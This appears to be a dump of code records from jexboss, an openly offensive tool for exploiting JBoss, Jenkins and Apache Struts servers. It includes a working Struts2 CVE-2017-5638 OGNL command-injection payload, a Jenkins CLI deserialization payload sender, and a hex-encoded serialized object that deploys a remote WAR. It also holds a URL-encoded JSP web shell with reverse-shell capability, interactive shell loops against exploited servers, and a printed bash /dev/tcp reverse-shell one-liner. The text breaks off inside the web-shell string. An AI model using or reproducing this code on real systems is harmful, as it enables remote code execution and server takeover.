url.split('://')[1].split('/')[0].split(':')[0]\nelse:\n    cli_ip = url.split('/')[0].split(':')[0]\nr = gl_http_pool.request('GET', url, redirect=True, headers=headers)\nall_headers = r.getheaders()\nfor h in all_headers:\n    if 'CLI-Port' in h:\n        cli_port = int(all_headers[h])\n        break\n# if the cli port or ip was not found\nif cli_port is None or cli_ip is None: return 505\n\n# stage 2: connect to CLI port and send payload (message + gadget )\n# generate payload\npayload = b\"<===[JENKINS REMOTING CAPACITY]===>\"\ncmd = generate_cmd_for_runtime_exec(cmd=cmd, host=host, port=port, is_win=is_win)\nif gadget == 'commons-collections3.1':\n    gadget = 'groovy1'\npayload_gadget = get_payload_gadget(gadget_type=gadget, cmd=cmd)\ngift_b64 = base64.b64encode(payload_gadget)\npayload += gift_b64\n\njexboss.print_and_flush(GREEN + \"\\n * Sending serialized object to: %s:%s\\n\" % (cli_ip, cli_port) + ENDC)\n# establishes connection and send the payload\ntry:\n    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.settimeout(7)\n    s.connect((cli_ip, cli_port))\n    s.send(b\"\\x00\\x14Protocol:CLI-connect\")\n\n    # receive all messages from the server\n    while b'JENKINS REMOTING CAPACITY' not in s.recv(1024): pass\n\n    s.send(payload)\n    s.close()\nexcept socket.error as err:\n    jexboss.print_and_flush(RED + \"\\n * [ERROR]: %s (%s:%s).\\n\" % (err,cli_ip, cli_port )+ ENDC)\n    return 505\n\n# if no erros ocorred, consider that payload was send successfuly\nreturn 200", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nPrint the banner\n\"\"\"\n", "func_signal": "def banner():\n", "code": "clear()\nprint_and_flush(RED1 + \"\\n * --- JexBoss: Jboss verify and EXploitation Tool  --- *\\n\"\n             \" |  * And others Java Deserialization Vulnerabilities * | \\n\"\n             \" |                                                      |\\n\"\n             \" | @author:  Jo\u00e3o Filho Matos Figueiredo                |\\n\"\n             \" | @contact: joaomatosf@gmail.com                       |\\n\"\n             \" |                                                      |\\n\"\n             \" | @update: https://github.com/joaomatosf/jexboss       |\\n\"\n             \" #______________________________________________________#\\n\")\nprint_and_flush(RED1 + \" @version: %s\" % __version__)\nprint_and_flush (ENDC)", "path": "jexboss/jexboss.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nConnect to an HTTP shell\n:param url: struts app url\n:param shell_type: The type of shell to connect to\n\"\"\"\n", "func_signal": "def shell_http_struts(url):\n", "code": "print_and_flush(\"# ----------------------------------------- #\\n\")\nprint_and_flush(GREEN + BOLD + \" * For a Reverse Shell (like meterpreter =]), type sometime like: \\n\\n\"\n                \"\\n\" +ENDC+\n                \"     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\\n\"\n                \"   \\n\"+GREEN+\n                \"   And so on... =]\\n\" +ENDC\n                )\nprint_and_flush(\"# ----------------------------------------- #\\n\")\n\nresp = _exploits.exploit_struts2_jakarta_multipart(url,'whoami', gl_args.cookies)\n\nprint_and_flush(resp.replace('\\\\n', '\\n'), same_line=True)\nlogging.info(\"Server %s exploited!\" %url)\n\nwhile 1:\n    print_and_flush(BLUE + \"[Type commands or \\\"exit\\\" to finish]\" +ENDC)\n\n    if not sys.stdout.isatty():\n        print_and_flush(\"Shell> \", same_line=True)\n        cmd = input() if version_info[0] >= 3 else raw_input()\n    else:\n        cmd = input(\"Shell> \") if version_info[0] >= 3 else raw_input(\"Shell> \")\n\n    if cmd == \"exit\":\n        break\n\n    resp = _exploits.exploit_struts2_jakarta_multipart(url, cmd, gl_args.cookies)\n    print_and_flush(resp.replace('\\\\n', '\\n'))", "path": "jexboss/jexboss.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nFind for content of the viewState param in source code\n:param page: The code of the page for search in it\n:return: The content of the viewstate param or None\n\"\"\"\n", "func_signal": "def get_viewstate_value(page):\n", "code": "page = str(page).replace(\"\\\\n\", \"\\n\")\nfull_param = \"name=\\\"javax.faces.ViewState\\\"\"\n\nfor i in page.strip().split('\\n'):\n\n    tokens = i.strip().split(\" \")\n\n    for t in tokens:\n\n        # get param value\n        if full_param in t:\n            index = tokens.index(full_param)\n            if 'value=\\\"' in tokens[index+1]:\n                obj = tokens[index+1].split(\"\\\"\")[1]\n                return obj\n            elif tokens[index+2]:\n                obj = tokens[index+2].split(\"\\\"\")[1]\n                return obj\n\nreturn None", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nConnect to an HTTP shell\n:param url: The URL to connect to\n:param shell_type: The type of shell to connect to\n\"\"\"\n", "func_signal": "def shell_http(url, shell_type):\n", "code": "headers = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n           \"Connection\": \"keep-alive\",\n           \"User-Agent\": get_random_user_agent()}\n\nif gl_args.disable_check_updates:\n    headers['no-check-updates'] = 'true'\n\nif shell_type == \"jmx-console\" or shell_type == \"web-console\" or shell_type == \"admin-console\":\n    path = '/jexws4/jexws4.jsp?'\nelif shell_type == \"JMXInvokerServlet\":\n    path = '/jexinv4/jexinv4.jsp?'\n\ngl_http_pool.request('GET', url+path, redirect=False, headers=headers)\n\nsleep(7)\nresp = \"\"\nprint_and_flush(\"# ----------------------------------------- # LOL # ----------------------------------------- #\\n\")\nprint_and_flush(RED + \" * \" + url + \": \\n\" + ENDC)\nprint_and_flush(\"# ----------------------------------------- #\\n\")\nprint_and_flush(GREEN + BOLD + \" * For a Reverse Shell (like meterpreter =]), type the command: \\n\\n\"\n                               \"   jexremote=YOUR_IP:YOUR_PORT\\n\\n\" + ENDC + GREEN +\n                \"   Example:\\n\" +ENDC+\n                \"     Shell>jexremote=192.168.0.10:4444\\n\"\n                \"\\n\" +GREEN+\n                \"   Or use other techniques of your choice, like:\\n\" +ENDC+\n                \"     Shell>/bin/bash -i > /dev/tcp/192.168.0.10/4444 0>&1 2>&1\\n\"\n                \"   \\n\"+GREEN+\n                \"   And so on... =]\\n\" +ENDC\n                )\nprint_and_flush(\"# ----------------------------------------- #\\n\")\n\nfor cmd in ['uname -a', 'cat /etc/issue', 'id']:\n    cmd = urlencode({\"ppp\": cmd})\n    try:\n        r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)\n        resp += \" \" + str(r.data).split(\">\")[1]\n    except:\n        print_and_flush(RED + \" * Apparently an IPS is blocking some requests. Check for updates will be disabled...\\n\\n\"+ENDC)\n        logging.warning(\"Disabling checking for updates.\", exc_info=traceback)\n        headers['no-check-updates'] = 'true'\n\nprint_and_flush(resp.replace('\\\\n', '\\n'), same_line=True)\nlogging.info(\"Server %s exploited!\" %url)\n\nwhile 1:\n    print_and_flush(BLUE + \"[Type commands or \\\"exit\\\" to finish]\" +ENDC)\n\n    if not sys.stdout.isatty():\n        print_and_flush(\"Shell> \", same_line=True)\n        cmd = input() if version_info[0] >= 3 else raw_input()\n    else:\n        cmd = input(\"Shell> \") if version_info[0] >= 3 else raw_input(\"Shell> \")\n\n    if cmd == \"exit\":\n        break\n\n    cmd = urlencode({\"ppp\": cmd})\n    try:\n        r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)\n    except:\n        print_and_flush(RED + \" * Error contacting the command shell. Try again and see logs for details ...\")\n        logging.error(\"Error contacting the command shell\", exc_info=traceback)\n        continue\n\n    resp = str(r.data)\n    if r.status == 404:\n        print_and_flush(RED + \" * Error contacting the command shell. Try again later...\")\n        continue\n    stdout = \"\"\n    try:\n        stdout = resp.split(\"pre>\")[1]\n    except:\n        print_and_flush(RED + \" * Error contacting the command shell. Try again later...\")\n    if stdout.count(\"An exception occurred processing JSP page\") == 1:\n        print_and_flush(RED + \" * Error executing command \\\"%s\\\". \" % cmd.split(\"=\")[1] + ENDC)\n    else:\n        print_and_flush(stdout.replace('\\\\n', '\\n'))", "path": "jexboss/jexboss.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploit Jakarta Multipart parser in Apache Struts (CVE-2017-5638)\nExploit improved from available in metasploit. This version works against Windows with Eastern language.\n:param url: The url to exploi\n:param cmd: Command to execute\n:return: output of executed command\n\"\"\"\n", "func_signal": "def exploit_struts2_jakarta_multipart(url,cmd, cookies):\n", "code": "cmd = cmd.replace('  ', ' ')\nheaders = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n           \"Connection\": \"close\",\n           \"User-Agent\": jexboss.get_random_user_agent()}\n\ncontent_type = (\"%%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).\"\n                \"(#_memberAccess?(#_memberAccess=#dm):\"\n                \"((#container=#context['com.opensymphony.xwork2.ActionContext.container']).\"\n                \"(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).\"\n                \"(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).\"\n                \"(#context.setMemberAccess(#dm)))).\"\n                \"(#gift='%s').\"\n                \"(#isnix=(@java.lang.System@getProperty('file.separator').equals(\\\"/\\\"))).\"\n                \"(#giftarray=(#isnix?{'/bin/bash','-c',#gift}:{'cmd.exe','/c',#gift})).\"\n                \"(#p=new java.lang.ProcessBuilder(#giftarray)).\"\n                \"(#p.redirectErrorStream(true)).(#process=#p.start()).\"\n                \"(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).\"\n                \"(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).\"\n                \"(#ros.flush())}\" %cmd)\n\nheaders['Content-Type'] = content_type\nif cookies is not None: headers['Cookie'] = cookies\nr = gl_http_pool.request('GET', url, redirect=True, headers=headers)\n\nif r.status == 404:\n    headers['Content-Type'] = 'text/html'\n    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)\n    if r.status == 200:\n        return \"   Could not get command output. You need to set up an Authoritative DNS and try to get the\\n\" \\\n               \"   output of the commands via DNS covert channel.\\n\"\nreturn str(r.data)", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nSearch for parameters that contain a java serialized object\n:param page: The page source code for search in it\n:return: List of parameters found\n\"\"\"\n", "func_signal": "def get_list_params_with_serialized_objs(page):\n", "code": "page = str(page).replace(\"\\\\n\", \"\\n\")\nlist_params = []\n\nfor i in page.split('\\n'):\n\n    tokens = i.strip().split(\" \")\n\n    for ind in range(0, len(tokens)):\n\n        t = tokens[ind]\n\n        if 'value=\\\"H4sI' in t or 'value=\\\"rO0' in t:\n\n            if 'name=\\\"' in tokens[ind-1] or 'id=\\\"' in tokens[ind-1]:\n                param = tokens[ind-1].split(\"\\\"\")[1]\n                if param not in list_params:\n                    list_params.append(param)\n\nreturn list_params", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\n# FIX: this is not ready yet...\nExploit Jakarta Multipart parser in Apache Struts (CVE-2017-5638)\nExploit improved from @frohoff version (https://gist.github.com/frohoff/a3e24764561c0c18b6270805140e7600#file-reqnull-txt)\n:param url: The url to exploi\n:param cmd: Command to execute\n:return: output of executed command\n\"\"\"\n", "func_signal": "def exploit_struts2_jakarta_multipart_v2(url,cmd, cookies):\n", "code": "cmd = cmd.replace('  ', ' ')\nheaders = {\"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\",\n           \"Connection\": \"close\",\n           \"User-Agent\": jexboss.get_random_user_agent(),\n           \"Content-Type\": \"multipart/form-data; boundary=e85e9b09934f4b9daaa7ff6352cdf2df\"}", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploits web console invoker (/web-console/Invoker)\nIn Jboss 5, this method only works to deploy a .war within the server fs (not http).\n:param url: The URL to exploit\n:return: The HTTP status code\n\"\"\"\n", "func_signal": "def exploit_web_console_invoker(url):\n", "code": "payload = (\"\\xAC\\xED\\x00\\x05\\x73\\x72\\x00\\x2E\\x6F\\x72\\x67\\x2E\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x63\\x6F\\x6E\\x73\\x6F\"\n       \"\\x6C\\x65\\x2E\\x72\\x65\\x6D\\x6F\\x74\\x65\\x2E\\x52\\x65\\x6D\\x6F\\x74\\x65\\x4D\\x42\\x65\\x61\\x6E\\x49\\x6E\\x76\"\n       \"\\x6F\\x63\\x61\\x74\\x69\\x6F\\x6E\\xE0\\x4F\\xA3\\x7A\\x74\\xAE\\x8D\\xFA\\x02\\x00\\x04\\x4C\\x00\\x0A\\x61\\x63\\x74\"\n       \"\\x69\\x6F\\x6E\\x4E\\x61\\x6D\\x65\\x74\\x00\\x12\\x4C\\x6A\\x61\\x76\\x61\\x2F\\x6C\\x61\\x6E\\x67\\x2F\\x53\\x74\\x72\"\n       \"\\x69\\x6E\\x67\\x3B\\x5B\\x00\\x06\\x70\\x61\\x72\\x61\\x6D\\x73\\x74\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\\x2F\\x6C\"\n       \"\\x61\\x6E\\x67\\x2F\\x4F\\x62\\x6A\\x65\\x63\\x74\\x3B\\x5B\\x00\\x09\\x73\\x69\\x67\\x6E\\x61\\x74\\x75\\x72\\x65\\x74\"\n       \"\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\\x2F\\x6C\\x61\\x6E\\x67\\x2F\\x53\\x74\\x72\\x69\\x6E\\x67\\x3B\\x4C\\x00\\x10\"\n       \"\\x74\\x61\\x72\\x67\\x65\\x74\\x4F\\x62\\x6A\\x65\\x63\\x74\\x4E\\x61\\x6D\\x65\\x74\\x00\\x1D\\x4C\\x6A\\x61\\x76\\x61\"\n       \"\\x78\\x2F\\x6D\\x61\\x6E\\x61\\x67\\x65\\x6D\\x65\\x6E\\x74\\x2F\\x4F\\x62\\x6A\\x65\\x63\\x74\\x4E\\x61\\x6D\\x65\\x3B\"\n       \"\\x78\\x70\\x74\\x00\\x06\\x64\\x65\\x70\\x6C\\x6F\\x79\\x75\\x72\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\"\n       \"\\x6E\\x67\\x2E\\x4F\\x62\\x6A\\x65\\x63\\x74\\x3B\\x90\\xCE\\x58\\x9F\\x10\\x73\\x29\\x6C\\x02\\x00\\x00\\x78\\x70\\x00\"\n       \"\\x00\\x00\\x01\\x73\\x72\\x00\\x0C\\x6A\\x61\\x76\\x61\\x2E\\x6E\\x65\\x74\\x2E\\x55\\x52\\x4C\\x96\\x25\\x37\\x36\\x1A\"\n       \"\\xFC\\xE4\\x72\\x03\\x00\\x07\\x49\\x00\\x08\\x68\\x61\\x73\\x68\\x43\\x6F\\x64\\x65\\x49\\x00\\x04\\x70\\x6F\\x72\\x74\"\n       \"\\x4C\\x00\\x09\\x61\\x75\\x74\\x68\\x6F\\x72\\x69\\x74\\x79\\x71\\x00\\x7E\\x00\\x01\\x4C\\x00\\x04\\x66\\x69\\x6C\\x65\"\n       \"\\x71\\x00\\x7E\\x00\\x01\\x4C\\x00\\x04\\x68\\x6F\\x73\\x74\\x71\\x00\\x7E\\x00\\x01\\x4C\\x00\\x08\\x70\\x72\\x6F\\x74\"\n       \"\\x6F\\x63\\x6F\\x6C\\x71\\x00\\x7E\\x00\\x01\\x4C\\x00\\x03\\x72\\x65\\x66\\x71\\x00\\x7E\\x00\\x01\\x78\\x70\\xFF\\xFF\"\n       \"\\xFF\\xFF\\xFF\\xFF\\xFF\\xFF\\x74\\x00\\x0E\\x6A\\x6F\\x61\\x6F\\x6D\\x61\\x74\\x6F\\x73\\x66\\x2E\\x63\\x6F\\x6D\\x74\"\n       \"\\x00\\x0F\\x2F\\x72\\x6E\\x70\\x2F\\x6A\\x65\\x78\\x77\\x73\\x34\\x2E\\x77\\x61\\x72\\x71\\x00\\x7E\\x00\\x0B\\x74\\x00\"\n       \"\\x04\\x68\\x74\\x74\\x70\\x70\\x78\\x75\\x72\\x00\\x13\\x5B\\x4C\\x6A\\x61\\x76\\x61\\x2E\\x6C\\x61\\x6E\\x67\\x2E\\x53\"\n       \"\\x74\\x72\\x69\\x6E\\x67\\x3B\\xAD\\xD2\\x56\\xE7\\xE9\\x1D\\x7B\\x47\\x02\\x00\\x00\\x78\\x70\\x00\\x00\\x00\\x01\\x74\"\n       \"\\x00\\x0C\\x6A\\x61\\x76\\x61\\x2E\\x6E\\x65\\x74\\x2E\\x55\\x52\\x4C\\x73\\x72\\x00\\x1B\\x6A\\x61\\x76\\x61\\x78\\x2E\"\n       \"\\x6D\\x61\\x6E\\x61\\x67\\x65\\x6D\\x65\\x6E\\x74\\x2E\\x4F\\x62\\x6A\\x65\\x63\\x74\\x4E\\x61\\x6D\\x65\\x0F\\x03\\xA7\"\n       \"\\x1B\\xEB\\x6D\\x15\\xCF\\x03\\x00\\x00\\x78\\x70\\x74\\x00\\x21\\x6A\\x62\\x6F\\x73\\x73\\x2E\\x73\\x79\\x73\\x74\\x65\"\n       \"\\x6D\\x3A\\x73\\x65\\x72\\x76\\x69\\x63\\x65\\x3D\\x4D\\x61\\x69\\x6E\\x44\\x65\\x70\\x6C\\x6F\\x79\\x65\\x72\\x78\")\n\nheaders = {\n    \"Content-Type\": \"application/x-java-serialized-object; class=org.jboss.console.remote.RemoteMBeanInvocation\",\n    \"Accept\": \"text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2\",\n    \"Connection\": \"keep-alive\",\n    \"User-Agent\": jexboss.get_random_user_agent()}\nr = gl_http_pool.urlopen('POST', url + \"/web-console/Invoker\", redirect=False, headers=headers, body=payload)\nresult = r.status\nif result == 401:\n    jexboss.print_and_flush(\"   Retrying...\")\n    gl_http_pool.urlopen('HEAD', url + \"/web-console/Invoker\", redirect=False, headers=headers, body=payload)\n\nreturn get_successfully(url, \"/jexws4/jexws4.jsp\")", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nSearch for link to post data in the page\n:param page: The code of the page for search in it\n:return: The link for post method or None\n\"\"\"\n", "func_signal": "def get_link_for_post(page):\n", "code": "page = str(page).replace(\"\\\\n\", \"\\n\")\n# stage 1 - search for form-urlencoded\nfor line in page.strip().split('\\n'):\n    # this is the post line\n    if 'application/x-www-form-urlencoded' in line:\n        tokens = line.strip().split(\" \")\n        for t in tokens:\n            if 'action' in t and len(t) > 10:\n                return t.split(\">\")[0][8:-1]\n\n# stage 2 - search for any post method\nfor line in page.strip().split('\\n'):\n    # this is the post line\n    if 'method=\\\"post\\\"' in line.lower():\n        tokens = line.strip().split(\" \")\n        for t in tokens:\n            if 'action' in t and len(t) > 10:\n                return t.split(\">\")[0][8:-1]\n\nreturn None", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nConfigure pool http\n:param pool: http pool\n\"\"\"\n", "func_signal": "def set_http_pool(pool):\n", "code": "global gl_http_pool\ngl_http_pool = pool", "path": "jexboss/_exploits.py", "commit_date": "2017-03-28 00:00:00", "repo_name": "joaomatosf/jexboss", "stars": 2345, "license": "other", "language": "python", "size": 4234}
{"docstring": "\"\"\"\nExploit DeploymentFileRepository to deploy a JSP shell\nTested and working in JBoss 4, 5 and 6.\n/jmx-console/HtmlAdaptor\n:param url: The URL to exploit\n:return: The HTTP status code\n\"\"\"\n", "func_signal": "def exploit_jmx_console_file_repository(url):\n", "code": "jsp = (\"%3C%25%40%20%70%61%67%65%20%69%6D%70%6F%72%74%3D%22%6A%61%76%61%2E%6C%61%6E%67%2E%2A%2C%6A%61\"\n       \"%76%61%2E%75%74%69%6C%2E%2A%2C%6A%61%76%61%2E%69%6F%2E%2A%2C%6A%61%76%61%2E%6E%65%74%2E%2A%22%20\"\n       \"%70%61%67%65%45%6E%63%6F%64%69%6E%67%3D%22%55%54%46%2D%38%22%25%3E%20%3C%70%72%65%3E%20%3C%25%20\"\n       \"%63%6C%61%73%73%20%72%76%20%65%78%74%65%6E%64%73%20%54%68%72%65%61%64%7B%49%6E%70%75%74%53%74%72\"\n       \"%65%61%6D%20%69%73%3B%4F%75%74%70%75%74%53%74%72%65%61%6D%20%6F%73%3B%72%76%28%49%6E%70%75%74%53\"\n       \"%74%72%65%61%6D%20%69%73%2C%4F%75%74%70%75%74%53%74%72%65%61%6D%20%6F%73%29%7B%74%68%69%73%2E%69\"\n       \"%73%3D%69%73%3B%74%68%69%73%2E%6F%73%3D%6F%73%3B%7D%70%75%62%6C%69%63%20%76%6F%69%64%20%72%75%6E\"\n       \"%28%29%7B%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%69%6E%3D%6E%75%6C%6C%3B%42%75%66%66%65%72\"\n       \"%65%64%57%72%69%74%65%72%20%6F%75%74%3D%6E%75%6C%6C%3B%74%72%79%7B%69%6E%3D%6E%65%77%20%42%75%66\"\n       \"%66%65%72%65%64%52%65%61%64%65%72%28%6E%65%77%20%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65\"\n       \"%72%28%74%68%69%73%2E%69%73%29%29%3B%6F%75%74%3D%6E%65%77%20%42%75%66%66%65%72%65%64%57%72%69%74\"\n       \"%65%72%28%6E%65%77%20%4F%75%74%70%75%74%53%74%72%65%61%6D%57%72%69%74%65%72%28%74%68%69%73%2E%6F\"\n       \"%73%29%29%3B%63%68%61%72%20%62%5B%5D%3D%6E%65%77%20%63%68%61%72%5B%38%31%39%32%5D%3B%69%6E%74%20\"\n       \"%6C%3B%77%68%69%6C%65%28%28%6C%3D%69%6E%2E%72%65%61%64%28%62%2C%30%2C%62%2E%6C%65%6E%67%74%68%29\"\n       \"%29%3E%30%29%7B%6F%75%74%2E%77%72%69%74%65%28%62%2C%30%2C%6C%29%3B%6F%75%74%2E%66%6C%75%73%68%28\"\n       \"%29%3B%7D%7D%63%61%74%63%68%28%45%78%63%65%70%74%69%6F%6E%20%65%29%7B%7D%7D%7D%53%74%72%69%6E%67\"\n       \"%20%73%68%3D%6E%75%6C%6C%3B%69%66%28%72%65%71%75%65%73%74%2E%67%65%74%50%61%72%61%6D%65%74%65%72\"\n       \"%28%22%70%70%70%22%29%21%3D%6E%75%6C%6C%29%7B%73%68%3D%72%65%71%75%65%73%74%2E%67%65%74%50%61%72\"\n       \"%61%6D%65%74%65%72%28%22%70%70%70%22%29%3B%7D%65%6C%73%65%20%69%66%28%72%65%71%75%65%73%74%2E%67\"\n       \"%65%74%48%65%61%64%65%72%28%22%58%2D%4A%45%58%22%29%21%3D%20%6E%75%6C%6C%29%7B%73%68%3D%72%65%71\"\n       \"%75%65%73%74%2E%67%65%74%48%65%61%64%65%72%28%22%58%2D%4A%45%58%22%29%3B%7D%69%66%28%73%68%20%21\"\n       \"%3D%20%6E%75%6C%6C%29%7B%72%65%73%70%6F%6E%73%65%2E%73%65%74%43%6F%6E%74%65%6E%74%54%79%70%65%28\"\n       \"%22%74%65%78%74%2F%68%74%6D%6C%22%29%3B%42%75%66%66%65%72%65%64%52%65%61%64%65%72%20%62%72%3D%6E\"\n       \"%75%6C%6C%3B%53%74%72%69%6E%67%20%6C%68%63%3D%28%6E%65%77%20%44%61%74%65%28%29%2E%74%6F%53%74%72\"\n       \"%69%6E%67%28%29%2E%73%70%6C%69%74%28%22%3A%22%29%5B%30%5D%2B%22%68%2E%6C%6F%67%22%29%2E%72%65%70\"\n       \"%6C%61%63%65%41%6C%6C%28%22%20%22%2C%22%2D%22%29%3B%74%72%79%7B%69%66%28%72%65%71%75%65%73%74%2E\"\n       \"%67%65%74%48%65%61%64%65%72%28%22%6E%6F%2D%63%68%65%63%6B%2D%75%70%64%61%74%65%73%22%29%3D%3D%6E\"\n       \"%75%6C%6C%29%7B%48%74%74%70%55%52%4C%43%6F%6E%6E%65%63%74%69%6F%6E%20%63%3D%28%48%74%74%70%55%52\"\n       \"%4C%43%6F%6E%6E%65%63%74%69%6F%6E%29%6E%65%77%20%55%52%4C%28%22%68%74%74%70%3A%2F%2F%77%65%62%73\"\n       \"%68%65%6C%6C%2E%6A%65%78%62%6F%73%73%2E%6E%65%74%2F%6A%73%70%5F%76%65%72%73%69%6F%6E%2E%74%78%74\"\n       \"%22%29%2E%6F%70%65%6E%43%6F%6E%6E%65%63%74%69%6F%6E%28%29%3B%63%2E%73%65%74%52%65%71%75%65%73%74\"\n       \"%50%72%6F%70%65%72%74%79%28%22%55%73%65%72%2D%41%67%65%6E%74%22%2C%72%65%71%75%65%73%74%2E%67%65\"\n       \"%74%48%65%61%64%65%72%28%22%48%6F%73%74%22%29%2B%22%3C%2D%22%2B%72%65%71%75%65%73%74%2E%67%65%74\"\n       \"%52%65%6D%6F%74%65%41%64%64%72%28%29%29%3B%69%66%28%21%6E%65%77%20%46%69%6C%65%28%22%63%68%65%63\"\n       \"%6B%5F%22%2B%6C%68%63%29%2E%65%78%69%73%74%73%28%29%29%7B%50%72%69%6E%74%57%72%69%74%65%72%20%77\"\n       \"%3D%6E%65%77%20%50%72%69%6E%74%57%72%69%74%65%72%28%22%63%68%65%63%6B%5F%22%2B%6C%68%63%29%3B%77\"\n       \"%2E%63%6C%6F%73%65%28%29%3B%62%72%3D%6E%65%77%20%42%75%66%66%65%72%65%64%52%65%61%64%65%72%28%6E\"\n       \"%65%77%20%49%6E%70%75%74%53%74%72%65%61%6D%52%65%61%64%65%72%28%63%2E%67%65%74%49%6E%70%75%74%53\"\n       \"%74%72%65%61%6D%28%29%29%29%3B%53%74%72%69%6E%67%20%6C%76%3D%62%72%2E%72%65%61%64%4C%69%6E%65%28\"\n       \"%29%2E%73%70%6C%69%74%28%22%20%22%29%5B%31%5D%3B%69%66%28%21%6C%76%2E%65%71%75%61%6C%73%28%22%34\"\n       \"%22%29%29%7B%6F%75%74%2E%70%72%69%6E%74%28%22%4E%65%77%20%76%65%72%73%69%6F%6E%2E%20%50%6C%65%61\"\n       \"%73%65%20%75%70%64%61%74%65%21%22%29%3B%7D%7D%65%6C%73%65%20%69%66%28%73%68%2E%69%6E%64%65%78%4F\"\n       \"%66%28%22%69%64%22%29%21%3D%2D%31%7C%7C%73%68%2E%69%6E%64%65%78%4F%66%28%22%69%70%63%6F%6E%66%69\"\n       \"%67%22%29%21%3D%2D%31%29%7B%63%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%3B%7D%7D%7D%63\"\n       \"%61%74%63%68%28%45%78%63%65%70%74%69%6F%6E%20%65%29%7B%6F%75%74%2E%70%72%69%6E%74%6C%6E%28%22%46\"\n       \"%61%69%6C%65%64%20%74%6F%20%63%68%65%63%6B%20%66%6F%72%20%75%70%64%61%74%65%73%22%29%3B%7D%74%72\"\n       \"%79%7B%50%72%6F%63%65%73%73%20%70%3B%62%6F%6F%6C%65%61%6E%20%6E%69%78%3D%74%72%75%65%3B%69%66%28\"\n       \"%21%53%79%73%74%65%6D%2E%67%65%74%50%72%6F%70%65%72%74%79%28%22%66%69%6C%65%2E%73%65%70%61%72%61\"\n       \"%74%6F%72%22%29%2E%65%71%75%61%6C%73%28%22%2F%22%29%29%7B%6E%69%78%3D%66%61%6C%73%65%3B%7D%69%66\"\n       \"%28%73%68%2E%69%6E%64%65%78%4F%66%28%22%6A%65%78%72%65%6D%6F%74%65%3D%22%29%21%3D%2D%31%29%7B%53\"\n       \"%6F%63%6B%65%74%20%73%63%3D%6E%65%77%20%53%6F%63%6B%65%74%28%73%68%2E%73%70%6C%69%74%28%22%3D%22\"\n       \"%29%5B%31%5D%2E%73%70%6C%69%74%28%22%3A%22%29%5B%30%5D%2C%49%6E%74%65%67%65%72%2E%70%61%72%73%65\"\n       \"%49%6E%74%28%73%68%2E%73%70%6C%69%74%28%22%3A%22%29%5B%31%5D%29%29%3B%69%66%28%6E%69%78%29%7B%73\"\n       \"%68%3D%22%2F%62%69%6E%2F%62%61%73%68%22%3B%7D%65%6C%73%65%7B%73%68%3D%22%63%6D%64%2E%65%78%65%22\"\n       \"%3B%7D%70%3D%52%75%6E%74%69%6D%65%2E%67%65%74%52%75%6E%74%69%6D%65%28%29%2E%65%78%65%63%28%73%68\"\n       \"%29%3B%28%6E%65%77%20%72%76%28%70%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%2C%73%63%2E\"\n       \"%67%65%74%4F%75%74%70%75%74%53%74%72%65%61%6D%28%29%29%29%2E%73%74%61%72%74%28%29%3B%28%6E%65%77\"\n       \"%20%72%76%28%73%63%2E%67%65%74%49%6E%70%75%74%53%74%72%65%61%6D%28%29%2C%70%2E%67%65%74%4F%75%74\"\n       \"%70%75%74%53%74%72%65%61%6D%28%29%29%29%2E%73%74%61%72%74%28%29%3B%7D%65%6C%73%65%7B%69%66%28%6E\"\n       